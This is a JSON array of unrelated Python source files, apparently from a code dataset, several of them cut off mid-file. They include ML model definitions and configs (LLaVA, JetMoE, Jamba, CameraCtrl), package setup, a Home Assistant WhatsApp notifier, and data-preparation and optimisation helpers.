[
    "import setuptools\n\nwith open('README.md', 'r', encoding='utf-8') as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name='sweagent',\n    author='John Yang',\n    author_email='byjohnyang@gmail.com',\n    description='The official SWE-agent package - an open source Agent Computer Interface for running language models as software engineers',\n    keywords='nlp, agents, code',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://swe-agent.com',\n    project_urls={\n        'Documentation': 'https://github.com/princeton-nlp/SWE-agent',\n        'Bug Reports': 'http://github.com/princeton-nlp/SWE-agent/issues',\n        'Source Code': 'http://github.com/princeton-nlp/SWE-agent',\n        'Website': 'https://sweagent.com',\n    },\n    packages=setuptools.find_packages(),\n    classifiers=[\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n    ],\n    python_requires='>=3.9',\n    install_requires=[\n        'anthropic',\n        'config',\n        'datasets',\n        'docker',\n        'gymnasium',\n        'numpy',\n        'openai>=1.0',\n        'pandas',\n        'rich',\n        'ollama',\n        'ruamel.yaml',\n        'simple-parsing',\n        'swebench>=1.0.1',\n        'tenacity',\n        'together',\n        'unidiff',\n    ],\n    include_package_data=True,\n)\n",
    "import logging\r\nimport json\r\nimport os\r\nfrom os.path import basename\r\nfrom urllib.parse import urlparse\r\nimport voluptuous as vol\r\nfrom whatsapp_api_client_python import API\r\nimport homeassistant.helpers.config_validation as cv\r\nfrom homeassistant.components.notify import (\r\n    ATTR_TARGET, ATTR_TITLE, ATTR_DATA, PLATFORM_SCHEMA, BaseNotificationService)\r\n\r\nATTR_INSTANCE = \"instance_id\"\r\nATTR_TOKEN = \"token\"\r\n\r\n\r\n_LOGGER = logging.getLogger(__name__)\r\n\r\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\r\n    # vol.Required(ATTR_TARGET): cv.string,\r\n    vol.Required(ATTR_INSTANCE): cv.string,\r\n    vol.Required(ATTR_TOKEN): cv.string,\r\n    vol.Optional(ATTR_TITLE): cv.string,\r\n})\r\n\r\ndef get_service(hass, config, discovery_info=None):\r\n    \"\"\"Get the custom notifier service.\"\"\"\r\n    title = config.get(ATTR_TITLE)\r\n    token = config.get(ATTR_TOKEN)\r\n    instance_id = config.get(ATTR_INSTANCE)\r\n    return GreenAPINotificationService(title, token, instance_id)\r\n\r\nclass GreenAPINotificationService(BaseNotificationService):\r\n    \r\n    def __init__(self, title, token,instance_id):\r\n        \"\"\"Initialize the service.\"\"\"\r\n        self._title = title\r\n        self._token = token\r\n        self._instance_id = instance_id\r\n        self._greenAPI = API.GreenAPI(self._instance_id, self._token)\r\n\r\n    def send_message(self, message=\"\", **kwargs):\r\n        \r\n        \"\"\"Send a message to the target.\"\"\"\r\n        \r\n        try:\r\n            title = kwargs.get(ATTR_TITLE)\r\n            if title is not None:\r\n                title = f\"*{title}*\"\r\n                message = f\"{title} \\n {message}\"\r\n            data = kwargs.get(ATTR_DATA)\r\n            target = kwargs.get(ATTR_TARGET)[0]\r\n            _LOGGER.info(f\"Sending message to {target}\")\r\n            if data is not None:\r\n                file_path = data[\"file\"]\r\n                if os.path.exists(file_path):\r\n                    upload_file_response = self._greenAPI.sending.uploadFile(file_path)\r\n                    if upload_file_response.code == 200:\r\n                        url_file = upload_file_response.data[\"urlFile\"]\r\n                        url = urlparse(url_file)\r\n                        file_name = basename(url.path)\r\n                        send_file_by_url_response = self._greenAPI.sending.sendFileByUrl(target, url_file, file_name, caption=message)\r\n            else:\r\n                self._greenAPI.sending.sendMessage(target, message)\r\n        except Exception as e:\r\n            _LOGGER.error(\"Sending message to %s: has failed with the following error %s\", kwargs.get(ATTR_TARGET)[0] ,str(e))",
    "# Import the torch library, which provides tools for machine learning\nimport torch\n\n# Import the Jamba model from the jamba.model module\nfrom jamba.model import Jamba\n\n# Create a tensor of random integers between 0 and 100, with shape (1, 100)\n# This simulates a batch of tokens that we will pass through the model\nx = torch.randint(0, 100, (1, 100))\n\n# Initialize the Jamba model with the specified parameters\n# dim: dimensionality of the input data\n# depth: number of layers in the model\n# num_tokens: number of unique tokens in the input data\n# d_state: dimensionality of the hidden state in the model\n# d_conv: dimensionality of the convolutional layers in the model\n# heads: number of attention heads in the model\n# num_experts: number of expert networks in the model\n# num_experts_per_token: number of experts used for each token in the input data\nmodel = Jamba(\n    dim=512,\n    depth=6,\n    num_tokens=100,\n    d_state=256,\n    d_conv=128,\n    heads=8,\n    num_experts=8,\n    num_experts_per_token=2,\n)\n\n# Perform a forward pass through the model with the input data\n# This will return the model's predictions for each token in the input data\noutput = model(x)\n\n# Print the model's predictions\nprint(output)\n",
    "import os\nimport json\nfrom pathlib import Path\nfrom dataclasses import dataclass\nimport concurrent.futures\n\nfrom tqdm.auto import tqdm\n\n# download_link: https://www.openslr.org/109/\n@dataclass\nclass DataConfig:\n    dataset_path = './raw_datasets/hi_fi_tts_v0'\n    output_filelist_path = './filelists/hifi_tts.txt'\n\ndata_config = DataConfig()\n    \ndef process_filelist(speaker):\n    filelist = []\n    with open(speaker, 'r', encoding='utf-8') as f:\n        for line in f:\n            line = json.loads(line.strip())\n            audio_path = os.path.abspath(os.path.join(data_config.dataset_path, line['audio_filepath']))\n            text = line['text_normalized']\n            if os.path.exists(audio_path):\n                filelist.append(f'{audio_path}|{text}\\n')\n    return filelist\n\nif __name__ == '__main__':\n    filelist = []   \n    results = []\n    \n    dataset_path = Path(data_config.dataset_path)\n    speakers = list(dataset_path.rglob('*.json'))\n           \n    with concurrent.futures.ProcessPoolExecutor(max_workers=1) as executor:\n        futures = [executor.submit(process_filelist, speaker) for speaker in speakers]\n        for future in tqdm(concurrent.futures.as_completed(futures), total=len(speakers)):\n            result = future.result()\n            if result is not None:\n                results.extend(result)\n                                 \n    # make sure that the parent dir exists, raising error at the last step is quite terrible OVO\n    os.makedirs(os.path.dirname(data_config.output_filelist_path), exist_ok=True)\n    with open(data_config.output_filelist_path, 'w', encoding='utf-8') as f:\n        f.writelines(results)",
    "# Adapted from https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/unet_2d_condition.py\nimport os\nimport json\nimport safetensors\nimport logging\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint\n\nfrom einops import repeat, rearrange\nfrom dataclasses import dataclass\nfrom typing import List, Optional, Tuple, Union, Dict, Any\n\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom diffusers.models.attention_processor import AttentionProcessor\n\nfrom diffusers.models.modeling_utils import ModelMixin\nfrom diffusers.utils import BaseOutput, logging\nfrom diffusers.models.embeddings import TimestepEmbedding, Timesteps\nfrom diffusers.models.attention_processor import LoRAAttnProcessor\nfrom diffusers.loaders import AttnProcsLayers, UNet2DConditionLoadersMixin\n\nfrom cameractrl.models.unet_blocks import (\n    CrossAttnDownBlock3D,\n    CrossAttnUpBlock3D,\n    DownBlock3D,\n    UNetMidBlock3DCrossAttn,\n    UpBlock3D,\n    get_down_block,\n    get_up_block,\n)\nfrom cameractrl.models.attention_processor import (\n    LORAPoseAdaptorAttnProcessor,\n    PoseAdaptorAttnProcessor\n)\nfrom cameractrl.models.attention_processor import LoRAAttnProcessor as CustomizedLoRAAttnProcessor\nfrom cameractrl.models.attention_processor import AttnProcessor as CustomizedAttnProcessor\nfrom cameractrl.models.resnet import (\n    InflatedConv3d,\n    FusionBlock2D\n)\n\n@dataclass\nclass UNet3DConditionOutput(BaseOutput):\n    sample: torch.FloatTensor\n\n\nclass UNet3DConditionModel(ModelMixin, ConfigMixin, UNet2DConditionLoadersMixin):\n    _supports_gradient_checkpointing = True\n\n    @register_to_config\n    def __init__(\n            self,\n            sample_size: Optional[int] = None,\n            in_channels: int = 4,\n            out_channels: int = 4,\n            center_input_sample: bool = False,\n            flip_sin_to_cos: bool = True,\n            freq_shift: int = 0,\n            down_block_types: Tuple[str] = (\n                    \"CrossAttnDownBlock3D\",\n                    \"CrossAttnDownBlock3D\",\n                    \"CrossAttnDownBlock3D\",\n                    \"DownBlock3D\",\n            ),\n            mid_block_type: str = \"UNetMidBlock3DCrossAttn\",\n            up_block_types: Tuple[str] = (\n                    \"UpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n                    \"CrossAttnUpBlock3D\",\n            ),\n            only_cross_attention: Union[bool, Tuple[bool]] = False,\n            block_out_channels: Tuple[int] = (320, 640, 1280, 1280),\n            layers_per_block: int = 2,\n            downsample_padding: int = 1,\n            mid_block_scale_factor: float = 1,\n            act_fn: str = \"silu\",\n            norm_num_groups: int = 32,\n            norm_eps: float = 1e-5,\n            cross_attention_dim: int = 1280,\n            attention_head_dim: Union[int, Tuple[int]] = 8,\n            dual_cross_attention: bool = False,\n            use_linear_projection: bool = False,\n            class_embed_type: Optional[str] = None,\n            addition_embed_type: Optional[str] = None,\n            num_class_embeds: Optional[int] = None,\n            upcast_attention: bool = False,\n            resnet_time_scale_shift: str = \"default\",\n\n            # Additional\n            use_motion_module=False,\n            motion_module_resolutions=(1, 2, 4, 8),\n            motion_module_mid_block=False,\n            motion_module_type=None,\n            motion_module_kwargs={},\n\n            # whether fuse first frame's feature\n            fuse_first_frame: bool = False,\n    ):\n        super().__init__()\n        self.logger = logging.get_logger(__name__)\n\n        self.sample_size = sample_size\n        time_embed_dim = block_out_channels[0] * 4\n\n        # input\n        self.conv_in = InflatedConv3d(in_channels, block_out_channels[0], kernel_size=3, padding=(1, 1))\n\n        # time\n        self.time_proj = Timesteps(block_out_channels[0], flip_sin_to_cos, freq_shift)\n        timestep_input_dim = block_out_channels[0]\n\n        self.time_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n\n        # class embedding\n        if class_embed_type is None and num_class_embeds is not None:\n            self.class_embedding = nn.Embedding(num_class_embeds, time_embed_dim)\n        elif class_embed_type == \"timestep\":\n            self.class_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n        elif class_embed_type == \"identity\":\n            self.class_embedding = nn.Identity(time_embed_dim, time_embed_dim)\n        else:\n            self.class_embedding = None\n\n        self.down_blocks = nn.ModuleList([])\n        self.mid_block = None\n        self.up_blocks = nn.ModuleList([])\n\n        self.down_fusers = nn.ModuleList([])\n        self.mid_fuser = None\n        self.down_fusers.append(\n            FusionBlock2D(\n                in_channels=block_out_channels[0],\n                out_channels=block_out_channels[0],\n                temb_channels=time_embed_",
    "from torch import nn\n\n\n# ==============================================================================\n# =                                    layer                                   =\n# ==============================================================================\n\nclass NoOp(nn.Module):\n\n    def __init__(self, *args, **keyword_args):\n        super(NoOp, self).__init__()\n\n    def forward(self, x):\n        return x\n\n\nclass Reshape(nn.Module):  # 0\u8868\u793a\u4fdd\u6301\u5f53\u524d\u5927\u5c0f\n\n    def __init__(self, *new_shape):\n        super(Reshape, self).__init__()\n        self._new_shape = new_shape\n\n    def forward(self, x):\n        new_shape = (x.size(i) if self._new_shape[i] == 0 else self._new_shape[i] for i in range(len(self._new_shape)))\n        return x.view(*new_shape)\n\n\n# ==============================================================================\n# =                                layer wrapper                               =\n# ==============================================================================\n\ndef identity(x, *args, **keyword_args):\n    return x\n",
    "import argparse\nimport torch\n\nfrom llava.constants import IMAGE_TOKEN_INDEX, DEFAULT_IMAGE_TOKEN, DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN\nfrom llava.conversation import conv_templates, SeparatorStyle\nfrom llava.model.builder import load_pretrained_model\nfrom llava.utils import disable_torch_init\nfrom llava.mm_utils import process_images, tokenizer_image_token, get_model_name_from_path\n\nfrom PIL import Image\n\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\nfrom transformers import TextStreamer\n\n\ndef load_image(image_file):\n    if image_file.startswith('http://') or image_file.startswith('https://'):\n        response = requests.get(image_file)\n        image = Image.open(BytesIO(response.content)).convert('RGB')\n    else:\n        image = Image.open(image_file).convert('RGB')\n    return image\n\n\ndef main(args):\n    # Model\n    disable_torch_init()\n\n    model_name = get_model_name_from_path(args.model_path)\n    tokenizer, model, image_processor, context_len = load_pretrained_model(args.model_path, args.model_base, model_name, args.load_8bit, args.load_4bit, device=args.device)\n\n    if \"llama-2\" in model_name.lower():\n        conv_mode = \"llava_llama_2\"\n    elif \"mistral\" in model_name.lower():\n        conv_mode = \"mistral_instruct\"\n    elif \"v1.6-34b\" in model_name.lower():\n        conv_mode = \"chatml_direct\"\n    elif \"v1\" in model_name.lower():\n        conv_mode = \"llava_v1\"\n    elif \"mpt\" in model_name.lower():\n        conv_mode = \"mpt\"\n    else:\n        conv_mode = \"llava_v0\"\n\n    if args.conv_mode is not None and conv_mode != args.conv_mode:\n        print('[WARNING] the auto inferred conversation mode is {}, while `--conv-mode` is {}, using {}'.format(conv_mode, args.conv_mode, args.conv_mode))\n    else:\n        args.conv_mode = conv_mode\n\n    conv = conv_templates[args.conv_mode].copy()\n    if \"mpt\" in model_name.lower():\n        roles = ('user', 'assistant')\n    else:\n        roles = conv.roles\n\n    image = load_image(args.image_file)\n    image_size = image.size\n    # Similar operation in model_worker.py\n    image_tensor = process_images([image], image_processor, model.config)\n    if type(image_tensor) is list:\n        image_tensor = [image.to(model.device, dtype=torch.float16) for image in image_tensor]\n    else:\n        image_tensor = image_tensor.to(model.device, dtype=torch.float16)\n\n    while True:\n        try:\n            inp = input(f\"{roles[0]}: \")\n        except EOFError:\n            inp = \"\"\n        if not inp:\n            print(\"exit...\")\n            break\n\n        print(f\"{roles[1]}: \", end=\"\")\n\n        if image is not None:\n            # first message\n            if model.config.mm_use_im_start_end:\n                inp = DEFAULT_IM_START_TOKEN + DEFAULT_IMAGE_TOKEN + DEFAULT_IM_END_TOKEN + '\\n' + inp\n            else:\n                inp = DEFAULT_IMAGE_TOKEN + '\\n' + inp\n            conv.append_message(conv.roles[0], inp)\n            image = None\n        else:\n            # later messages\n            conv.append_message(conv.roles[0], inp)\n        conv.append_message(conv.roles[1], None)\n        prompt = conv.get_prompt()\n\n        input_ids = tokenizer_image_token(prompt, tokenizer, IMAGE_TOKEN_INDEX, return_tensors='pt').unsqueeze(0).to(model.device)\n        stop_str = conv.sep if conv.sep_style != SeparatorStyle.TWO else conv.sep2\n        keywords = [stop_str]\n        streamer = TextStreamer(tokenizer, skip_prompt=True, skip_special_tokens=True)\n\n        with torch.inference_mode():\n            output_ids = model.generate(\n                input_ids,\n                images=image_tensor,\n                image_sizes=[image_size],\n                do_sample=True if args.temperature > 0 else False,\n                temperature=args.temperature,\n                max_new_tokens=args.max_new_tokens,\n                streamer=streamer,\n                use_cache=True)\n\n        outputs = tokenizer.decode(output_ids[0]).strip()\n        conv.messages[-1][-1] = outputs\n\n        if args.debug:\n            print(\"\\n\", {\"prompt\": prompt, \"outputs\": outputs}, \"\\n\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--model-path\", type=str, default=\"facebook/opt-350m\")\n    parser.add_argument(\"--model-base\", type=str, default=None)\n    parser.add_argument(\"--image-file\", type=str, required=True)\n    parser.add_argument(\"--device\", type=str, default=\"cuda\")\n    parser.add_argument(\"--conv-mode\", type=str, default=None)\n    parser.add_argument(\"--temperature\", type=float, default=0.2)\n    parser.add_argument(\"--max-new-tokens\", type=int, default=512)\n    parser.add_argument(\"--load-8bit\", action=\"store_true\")\n    parser.add_argument(\"--load-4bit\", action=\"store_true\")\n    parser.add_argument(\"--debug\", action=\"store_true\")\n    args = parser.parse_args()\n    main(args)\n",
    "# coding=utf-8\n# Copyright 2022 EleutherAI and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"PyTorch LLaMA model.\"\"\"\n\nimport math\nimport os\nimport warnings\nfrom typing import List, Optional, Tuple, Union, Callable\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom bitmat.bitlinear import BitLinear\nfrom bitmat.utils.pack_model_before_save import pack_ternary_model\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache, StaticCache\nfrom transformers.modeling_attn_mask_utils import AttentionMaskConverter\nfrom transformers.modeling_outputs import (\n    BaseModelOutputWithPast,\n    CausalLMOutputWithPast,\n    QuestionAnsweringModelOutput,\n    SequenceClassifierOutputWithPast,\n)\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.pytorch_utils import ALL_LAYERNORM_LAYERS\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_2_available,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\nfrom transformers.models.llama.configuration_llama import LlamaConfig\n\n\nif is_flash_attn_2_available():\n    from flash_attn import flash_attn_func, flash_attn_varlen_func\n    from flash_attn.bert_padding import index_first_axis, pad_input, unpad_input  # noqa\n\n\nlogger = logging.get_logger(__name__)\n\n_CONFIG_FOR_DOC = \"LlamaConfig\"\n\n\ndef _get_unpad_data(attention_mask):\n    seqlens_in_batch = attention_mask.sum(dim=-1, dtype=torch.int32)\n    indices = torch.nonzero(attention_mask.flatten(), as_tuple=False).flatten()\n    max_seqlen_in_batch = seqlens_in_batch.max().item()\n    cu_seqlens = F.pad(torch.cumsum(seqlens_in_batch, dim=0, dtype=torch.int32), (1, 0))\n    return (\n        indices,\n        cu_seqlens,\n        max_seqlen_in_batch,\n    )\n\n\n\n\n\nclass Llama158RotaryEmbedding(nn.Module):\n    def __init__(self, dim, max_position_embeddings=2048, base=10000, device=None, scaling_factor=1.0):\n        super().__init__()\n        self.scaling_factor = scaling_factor\n        self.dim = dim\n        self.max_position_embeddings = max_position_embeddings\n        self.base = base\n        inv_freq = 1.0 / (self.base ** (torch.arange(0, self.dim, 2, dtype=torch.int64).float().to(device) / self.dim))\n        self.register_buffer(\"inv_freq\", inv_freq, persistent=False)\n        # For BC we register cos and sin cached\n        self.max_seq_len_cached = max_position_embeddings\n        t = torch.arange(self.max_seq_len_cached, device=device, dtype=torch.int64).type_as(self.inv_freq)\n        t = t / self.scaling_factor\n        freqs = torch.outer(t, self.inv_freq)\n        # Different from paper, but it uses a different permutation in order to obtain the same calculation\n        emb = torch.cat((freqs, freqs), dim=-1)\n        self.register_buffer(\"_cos_cached\", emb.cos().to(torch.get_default_dtype()), persistent=False)\n        self.register_buffer(\"_sin_cached\", emb.sin().to(torch.get_default_dtype()), persistent=False)\n\n    @property\n    def sin_cached(self):\n        logger.warning_once(\n            \"The sin_cached attribute will be removed in 4.39. Bear in mind that its contents changed in v4.38. Use \"\n            \"the forward method of RoPE from now on instead. It is not used in the `Llama158Attention` class\"\n        )\n        return self._sin_cached\n\n    @property\n    def cos_cached(self):\n        logger.warning_once(\n            \"The cos_cached attribute will be removed in 4.39. Bear in mind that its contents changed in v4.38. Use \"\n            \"the forward method of RoPE from now on instead. It is not used in the `Llama158Attention` class\"\n        )\n        return self._cos_cached\n\n    @torch.no_grad()\n    def forward(self, x, position_ids):\n        # x: [bs, num_attention_heads, seq_len, head_size]\n        inv_freq_expanded = self.inv_freq[None, :, None].float().expand(position_ids.shape[0], -1, 1)\n        position_ids_expanded = position_ids[:, None, :].float()\n        # Force float32 since bfloat16 loses precision on long contexts\n      ",
    "# coding=utf-8\n# Copyright 2024 JetMoE AI and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"JetMoE model configuration\"\"\"\n\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\n\n\nlogger = logging.get_logger(__name__)\n\n\nclass JetMoEConfig(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`JetMoEModel`]. It is used to instantiate an\n    JetMoE model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a configuration of the JetMoE-4B.\n\n    [jetmoe/jetmoe-8b](https://huggingface.co/jetmoe/jetmoe-8b)\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n\n    Args:\n        vocab_size (`int`, *optional*, defaults to 32000):\n            Vocabulary size of the JetMoE model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`JetMoEModel`]\n        hidden_size (`int`, *optional*, defaults to 2048):\n            Dimension of the hidden representations.\n        num_hidden_layers (`int`, *optional*, defaults to 12): Defines the number of blocks.\n        num_attention_heads (`int`, *optional*, defaults to 32):\n            Number of attention heads for each attention layer in the Transformer encoder.\n        num_key_value_heads (`int`, *optional*, defaults to 16):\n            Number of attention heads for each key and value in the Transformer encoder.\n        kv_channels (`int`, *optional*, defaults to 128): Defines the number of channels for the key and value tensors.\n        ffn_hidden_size (`int`, *optional*, defaults to 5632): Defines the hidden size of the feed-forward layer.\n        max_position_embeddings (`int`, *optional*, defaults to 4096):\n            The maximum sequence length that this model might ever be used with. JetMoE's sliding window attention\n            allows sequence of up to 4096*32 tokens.\n        activation_function (`string`, *optional*, defaults to `\"silu\"`): Defines the activation function for MLP experts.\n        glu (`bool`, *optional*, defaults to `True`): Whether to use Gated Linear Units in the MLP experts.\n        moe_num_experts (`int`, *optional*, defaults to 8): Defines the number of experts in the mixture of experts.\n        moe_top_k (`int, *optional*, defaults to 2): Defines the number of experts to use for each token.\n        use_cache (`bool`, *optional*, defaults to `True`):\n            Whether or not the model should return the last key/values attentions (not used by all models). Only\n            relevant if `config.is_decoder=True`.\n        bos_token_id (`int`, *optional*, defaults to 1):\n            The id of the \"beginning-of-sequence\" token.\n        eos_token_id (`int`, *optional*, defaults to 2):\n            The id of the \"end-of-sequence\" token.\n        tie_word_embeddings (`bool`, *optional*, defaults to `True`):\n            Whether the model's input and output word embeddings should be tied.\n        bias (`bool`, *optional*, defaults to `True`): Whether to use bias in the feed-forward and attention layer.\n        rope_theta (`float`, *optional*, defaults to 10000.0):\n            The base period of the RoPE embeddings.\n        rms_norm_eps (`float`, *optional*, defaults to 1e-06):\n            The epsilon used by the rms normalization layers.\n        initializer_range (`float`, *optional*, defaults to 0.01):\n            The standard deviation of the truncated_normal_initializer for initializing all weight matrices.\n\n    ```python\n    >>> from transformers import JetMoEModel, JetMoEConfig\n\n    >>> # Initializing a JetMoE 4B style configuration\n    >>> configuration = JetMoEConfig()\n\n    >>> # Initializing a model from the JetMoE 4B style configuration\n    >>> model = JetMoEModel(configuration)\n\n    >>> # Accessing the model configuration\n    >>> configuration = model.config\n    ```\"\"\"\n\n    model_type = \"jetmoe\"\n    keys_to_ignore_at_inference = [\"past_key_values\"]\n\n    def __init__(\n        self,\n        vocab_size=32000,\n        hidden_size=2048,\n        num_hidden_layers=12,\n        num_attention_heads=32,\n        num_key_value_heads=16,\n        kv_channels=128,\n        ffn_hidden_size=5632,\n        max_position_embeddings=4096,\n        activation_function=\"silu\",\n    ",
    "import torch\n\nimport como.geometry.lie_algebra as lie\n\n\ndef row_col_to_lin_index(row, col, width):\n    return row * width + col\n\n\n# All should be 1D\n# NOTE: scatter_add_ is nondeterministic\ndef accumulate_gradient_scatter(g_batch, grad, grad_inds):\n    grad.scatter_add_(0, grad_inds, g_batch)\n\n\n# All should be 1D except Hessian 2D\n# NOTE: scatter_add_ is nondeterministic\ndef accumulate_hessian_scatter(H_batch, H, H_inds):\n    H_flat_view = H.view(-1)\n    H_flat_view.scatter_add_(0, H_inds, H_batch)\n\n\n# J (b,n,r,d), r (b,n,r) -> grad (b,d)\ndef get_gradient(J, r):\n    grad = -torch.sum(J * r[..., None], dim=(1, 2))\n    return grad\n\n\n# J (b,n,r,d) -> H (b,d,d)\ndef get_hessian_diag_block(J):\n    H_block = torch.einsum(\"bnck,bncl->bkl\", J, J)\n    return H_block\n\n\n# J1 (b,n,r,d1), J1 (b,n,r,d2) -> H12 (b,d1,d2)\ndef get_hessian_off_diag_block(J1, J2):\n    H12_blocks = torch.einsum(\"bnck,bncl->bkl\", J1, J2)\n    return H12_blocks\n\n\ndef accumulate_gradient_batched(g_batch, grad, grad_inds):\n    for b in range(g_batch.shape[0]):\n        inds_b = grad_inds[b, :]\n        grad[inds_b] += g_batch[b, :]\n\n\ndef accumulate_hessian_diag_batched(H_batch, H, H_inds):\n    for b in range(H_batch.shape[0]):\n        inds_b = H_inds[b, :]\n        H[inds_b[:, None], inds_b[None, :]] += H_batch[b, :, :]\n\n\ndef accumulate_hessian_off_diag_batched(H_batch, H, H_inds1, H_inds2):\n    for b in range(H_batch.shape[0]):\n        inds1_b = H_inds1[b, :]\n        inds2_b = H_inds2[b, :]\n        H[inds1_b[:, None], inds2_b[None, :]] += H_batch[b, :, :]\n        H[inds2_b[:, None], inds1_b[None, :]] += torch.transpose(\n            H_batch[b, :, :], dim0=0, dim1=1\n        )\n\n\n# H_blocks (b,m,d,d)\n# NOTE: Creates wasteful block diagonal matrix\ndef accumulate_hessian_block_diag(H_blocks, H, H_inds):\n    for b in range(H_blocks.shape[0]):\n        H_block = torch.block_diag(*H_blocks[b, ...])\n        inds_b = H_inds[b, :]\n        H[inds_b[:, None], inds_b[None, :]] += H_block\n\n\ndef get_batched_pose_inds(num_kf, device):\n    pose_dim = 6 * num_kf\n    inds_flat = torch.arange(pose_dim, device=device)\n    pose_inds = torch.reshape(inds_flat, (num_kf, -1))\n    return pose_inds\n\n\ndef landmark_to_batched_3d_point_inds(landmark_inds, num_kf):\n    device = landmark_inds.device\n    landmark_inds_batched = landmark_inds[:, 1].view(num_kf, -1)\n    # Go from landmark inds to Hessian indices (3D points)\n    p_inds_batched = 3 * (landmark_inds_batched.repeat_interleave(3, dim=1))\n    p_inds_batched += (\n        torch.arange(3, device=device)\n        .unsqueeze(0)\n        .repeat(num_kf, landmark_inds_batched.shape[1])\n    )\n    return p_inds_batched\n\n\ndef allocate_system(num_poses, num_landmarks, device):\n    pose_dim = 6 * num_poses\n    geo_dim = 3 * num_landmarks\n    dim = pose_dim + geo_dim\n    H = torch.zeros((dim, dim), device=device)\n    g = torch.zeros((dim,), device=device)\n    return H, g\n\n\ndef solve_system(H, g):\n    # # Check SVD of Hessian for debugging\n    # U, S, Vh = torch.linalg.svd(H)\n    # print(S.flatten())\n    # print(Vh[-1,:].flatten())\n    # print(Vh[-2,:].flatten())\n\n    # L = torch.linalg.cholesky(H, upper=False)\n    L, _ = torch.linalg.cholesky_ex(H, upper=False, check_errors=False)\n    delta = torch.cholesky_solve(g[:, None], L, upper=False)\n\n    return delta\n\n\ndef update_vars(\n    delta,\n    kf_poses,\n    kf_aff_params,\n    kf_inds,\n    recent_poses,\n    recent_aff_params,\n    recent_inds,\n    P,\n    landmark_ind_start,\n):\n    device = delta.device\n    dtype = delta.dtype\n\n    delta = delta.squeeze(-1)\n\n    kf_delta = delta[kf_inds]\n    kf_poses_new = lie.batch_se3(kf_poses, kf_delta[:, :6])\n    kf_aff_params_new = kf_aff_params + kf_delta[:, 6:, None]\n\n    if recent_inds.shape[0] > 0:\n        recent_delta = delta[recent_inds]\n        recent_poses_new = lie.batch_se3(recent_poses, recent_delta[:, :6])\n        recent_aff_params_new = recent_aff_params + recent_delta[:, 6:, None]\n    else:\n        recent_poses_new = torch.empty((0), device=device, dtype=dtype)\n        recent_aff_params_new = torch.empty((0), device=device, dtype=dtype)\n\n    P_delta = delta[landmark_ind_start:]\n    P_new = P + P_delta.view(-1, 3)\n\n    return (\n        kf_poses_new,\n        kf_aff_params_new,\n        recent_poses_new,\n        recent_aff_params_new,\n        P_new,\n    )\n",
    "from datasets import load_dataset, load_from_disk\nfrom transformers import AutoTokenizer, AutoModel, AutoModelForCausalLM, TextStreamer\nfrom huggingface_hub import hf_hub_download\nfrom rwkv.model import RWKV\nfrom rwkv.utils import PIPELINE, PIPELINE_ARGS\nimport torch\nimport argparse\nimport re\nfrom openai import OpenAI\nimport anthropic\nfrom mamba_ssm.models.mixer_seq_simple import MambaLMHeadModel\nimport vertexai\nfrom vertexai.generative_models import GenerativeModel, Part, GenerationConfig\nfrom lmdeploy import pipeline, GenerationConfig, TurbomindEngineConfig\nimport json\nimport os\n\nPROJECT_ID = \"gemini-infer\"  # @param {type:\"string\"}\nLOCATION = \"us-central1\"  # @param {type:\"string\"}\n\ngeneration_config = GenerationConfig(\n    temperature=1,\n    top_p=1.0,\n    top_k=32,\n    candidate_count=1,\n    max_output_tokens=100,\n)\n\nall_labels = [\"admiration\",\n                \"amusement\",\n                \"anger\",\n                \"annoyance\",\n                \"approval\",\n                \"caring\",\n                \"confusion\",\n                \"curiosity\",\n                \"desire\",\n                \"disappointment\",\n                \"disapproval\",\n                \"disgust\",\n                \"embarrassment\",\n                \"excitement\",\n                \"fear\",\n                \"gratitude\",\n                \"grief\",\n                \"joy\",\n                \"love\",\n                \"nervousness\",\n               